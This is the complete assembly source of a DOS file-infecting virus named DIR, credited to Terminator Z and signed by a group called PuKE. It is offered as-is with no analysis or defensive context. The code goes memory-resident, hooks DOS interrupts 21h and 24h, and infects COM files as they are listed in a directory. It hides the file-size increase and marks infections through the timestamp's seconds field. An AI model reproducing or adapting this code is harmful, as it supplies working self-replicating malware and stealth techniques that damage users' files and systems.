
; DIR
;
; by Terminator Z

; this virus will infect com files when you do a directory .. it will infect
; every com file as it comes up on the directory listing.
;
; this virus will not infect files if they have a seconds field of 58 seconds,
; and will hide the file size increase on these files while the virus is
; memory resident.


v_start:

                call si_set
si_set:         pop si
                sub si, offset si_set
                mov bp, ds

                mov ax, 0fedch
                int 21h
                jc exit_code

                mov ax, ds
                dec ax
tsr1:           mov ds, ax
                cmp byte ptr [0], 'Z'
                je tsr2
                add ax, word ptr [3]
                jmp tsr1
tsr2:           cmp word ptr [3], p_len+1
                jb exit_code
                sub word ptr [3], p_len
                add ax, word ptr [3]
                inc ax
                sub ax, 10h
                mov di, 100h
                mov es, ax
                mov cx, 512
                add si, offset v_start
                mov ds, bp
                rep movsw
                xor si, si
                push ax
                mov ax, offset fix_ints
                push ax
                retf

fix_ints:       push cs
                pop ds
                mov ax, 3521h
                int 21h
                mov word ptr [old_21], bx
                mov word ptr [old_21+2], es
                mov dx, offset new_21
                mov ax, 2521h
                int 21h

exit_code:      add si, offset orig_3
                mov es, bp
                mov di, 100h
                push bp
                push di
                movsw
                movsb
                mov ds, bp
                xor ax, ax
                mov bx, ax
                mov dx, ax
                mov si, ax
                mov di, ax
                mov bp, ax
                retf

new_21:         clc
                cmp ah, 11h
                je chk
                cmp ah, 12h
                je chk
                cmp ah, 1ah
                je dta_set
                cmp ax, 0fedch
                jne i_exit
                stc                     ; set carry
                iret
i_exit:         jmp dword ptr cs:[old_21]

function_call:  pushf
                call dword ptr cs:[old_21]
                ret

dta_set:        call function_call
                jnc ds2
ds1:            retf 2
ds2:            mov word ptr cs:[dta_save], dx
                mov word ptr cs:[dta_save+2], ds
                jmp short ds1

chk:            call function_call
                cmp al, 0
                je c2
                iret
c2:             push ax
                push bx
                push cx
                push dx
                push si
                push di
                push ds
                push es
                push bp
                push cs
                pop es
                lds si, dword ptr cs:[dta_save]
                lodsb
                dec si
                cmp al, 0ffh
                jne c3
                add si, 7               ; fix all this shit up
c3:             push si
                add si, 17h
                lodsw
                and ax, 29              ; 56 seconds
                jz c4
                add si, 4
                sub word ptr [si], v_len
                sbb word ptr [si-2], 0
                pop si
                jmp short c_exit

c4:             pop si
                mov bp, si
                add si, 9               ; up to extension
                lodsw
                and ax, 0dfdf           ; ->UC
                cmp ax, 'OC'
                jne c_exit
                lodsb
                and al, 0df
                cmp al, 'M'
                je c_inf
c_exit:         pop bp
                pop es
                pop ds
                pop di
                pop si
                pop dx
                pop cx
                pop bx
                pop ax
                iret
c_inf:          mov si, bp
                inc si
                mov di, filename_save
                mov cx, 8
cmov1:          lodsb
                cmp al,  ' '
                je cmov2
                stosb
cmov2:          loop cmov1
                mov al, '.'
                stosb
                movsw
                movsb
                xor ax, ax
                stosb                   ; make an ASCIIZ string

com_infection:  push cs
                pop ds
                mov ax, 3524h
                call function_call
                push bx
                push es
                push cs
                pop es
                mov dx, offset new_24
                mov ax, 2524h
                call function_call
                mov ax, 4300h
                mov dx, filename_save
                call function_call
                jnc k1
                jmp exit_1
k1:             push cx
                mov ax, 4301h
                xor cx, cx
                call function_call
                jc exit_2
                mov ax, 3d02h
                call function_call
                mov bp, ax
                xchg ax, bx
                mov ax, 5700h
                call function_call
                push cx
                push dx
                mov dx, offset orig_3
                mov ah, 3fh
                mov cx, 3
                call function_call
                mov ax, 4202h
                xor cx, cx
                xor dx, dx
                call function_call
                or dx, dx
                jnz exit_3
                push ax
                add ax, 102h+v_len
                pop ax
                jc exit_3
                cmp ax, 3
                jb exit_3
                dec ax
                dec ax
                dec ax
                mov di, offset com_stub+1
                stosw
                mov ah, 40h
                mov cx, v_len
                mov dx, 100h
                call function_call
                cmp ax, v_len
                jb exit_4               ; check number of bytes written
                xor cx, cx
                xor dx, dx
                mov ax, 4200h
                call function_call
                mov ah, 40h
                mov cx, 3
                mov dx, offset com_stub
                call function_call
                pop dx
                pop cx
                or cx, 29
                push dx
                push cx

exit_4:         mov ax, 5701h
                pop dx
                pop cx
                call function_call

exit_3:         mov ah, 3eh
                call function_call

exit_2:         pop cx
                mov ax, 4301h
                mov dx, filename_save
                call function_call

exit_1:         pop ds
                pop dx
                mov ax, 2524h
                call function_call
                jmp c_exit








new_24:         iret

orig_3:         int 20h
                nop

com_stub db     0e9h
        dw      0

        db      ' DIR by Drunk Avenger [PuKE] x92! '

v_end:

old_21  equ     $
dta_save equ    old_21 + 4
infected equ    dta_save + 4
filename_save equ infected + 1

p_len   equ     40h     ; 1k
v_len   equ     v_end - v_start


